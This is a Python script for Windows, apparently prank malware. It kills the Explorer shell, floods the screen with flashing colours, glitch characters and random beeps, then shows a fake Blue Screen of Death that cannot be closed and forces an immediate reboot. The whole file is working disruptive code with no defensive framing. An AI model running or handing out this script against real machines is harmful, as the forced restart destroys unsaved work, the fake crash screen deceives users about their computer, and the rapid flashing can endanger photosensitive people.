import win32gui as g
import win32api as a
import random
import time
import ctypes
import os
import tkinter as tk


sym = list("ｵﾘｱﾎﾃﾏｹﾒｴｶｷﾑﾕ日ﾊﾐﾋｰｳｼﾅﾓﾆｻﾜﾂ0123456789@#$%^&*")
glitch_text = "Hello?"


w, h = a.GetSystemMetrics(0), a.GetSystemMetrics(1)
dc = g.GetDC(0)


font = g.LOGFONT()
font.lfFaceName = "Consolas"
g.SetBkColor(dc, a.RGB(0, 0, 0))


colors = [a.RGB(r, g, b) for r, g, b in [
    (0, 255, 65), (255, 0, 0), (0, 0, 255), (255, 255, 255),
    (255, 255, 0), (0, 255, 255), (255, 0, 255), (128, 255, 0),
    (255, 128, 0), (128, 0, 255), (255, 0, 128)
]]

def insane_beep_burst():
    count = random.randint(5, 12)
    for _ in range(count):
        freq = random.randint(100, 4000)
        dur = random.randint(20, 120)
        try:
            ctypes.windll.kernel32.Beep(freq, dur)
        except:
            pass

def glitch_effect(duration=15):
    end_time = time.time() + duration

    while time.time() < end_time:
        if random.randint(0, 2) == 0:
            brush = g.CreateSolidBrush(random.choice(colors))
            g.FillRect(dc, (0, 0, w, h), brush)
            g.DeleteObject(brush)

        shake_x = random.randint(-25, 25)
        shake_y = random.randint(-25, 25)

        for _ in range(200):
            x = random.randint(0, w) + shake_x
            y = random.randint(0, h) + shake_y

            font.lfHeight = -random.randint(10, 40)
            chaos_font = g.CreateFontIndirect(font)
            g.SelectObject(dc, chaos_font)

            g.SetTextColor(dc, random.choice(colors))
            g.DrawText(dc, random.choice(sym), -1, (x, y, x + 40, y + 40), 0)

            g.DeleteObject(chaos_font)

        for _ in range(80):
            hx = random.randint(0, w) + shake_x
            hy = random.randint(0, h) + shake_y
            g.SetTextColor(dc, random.choice(colors))
            g.DrawText(dc, glitch_text, -1, (hx, hy, hx + 150, hy + 50), 0)

        insane_beep_burst()

        time.sleep(0.005)

    g.ReleaseDC(0, dc)  

def fake_bsod():
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.configure(bg="#0000AA")
    root.overrideredirect(True)

    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()

    if screen_height >= 1440:
        font_size = 20
    elif screen_height >= 1080:
        font_size = 18
    elif screen_height >= 768:
        font_size = 16
    else:
        font_size = 14

    bsod_text = """
***STOP: 0x000000D1 (0x00000000, 0xF73120AE, 0xC0000008, 0xC0000000)

A problem has been detected and Windows has been shut down to prevent damage to your computer.

DRIVER_IRQL_NOT_LESS_OR_EQUAL

If this is the first time you’ve seen this Stop error screen, restart your computer.
If this screen appears again, follow these steps:

Check to make sure any new hardware or software is properly installed.
If this is a new installation, ask your hardware or software manufacturer for any Windows updates you might need.

If problems continue, disable or remove any newly installed hardware or software. Disable BIOS memory options such as caching or shadowing.

If you need to use Safe Mode to remove or disable components, restart your computer, press F8 to select Advanced Startup Options, and then select Safe Mode.

*** WXYZ.SYS - Address F73120AE base at C0000000, DateStamp 36b072a3

Kernel Debugger Using: COM2 <Port 0x2f8, Baud Rate 19200>
Beginning dump of physical memory
Physical memory dump complete. Contact your system administrator or technical support group for further assistance.
    """

    canvas = tk.Canvas(root, bg="#0000AA", highlightthickness=0)
    canvas.pack(fill="both", expand=True)

    canvas.create_text(
        40, 40,
        text=bsod_text,
        font=("Courier New", font_size),
        fill="white",
        anchor="nw",
        width=screen_width - 80
    )

    
    root.after(15000, lambda: os.system("shutdown /r /t 0"))
    root.mainloop()

def main():
    
    os.system("taskkill /f /im explorer.exe")
    glitch_effect(duration=15)
    os.system("start explorer.exe")
    fake_bsod()

if __name__ == "__main__":
    main()
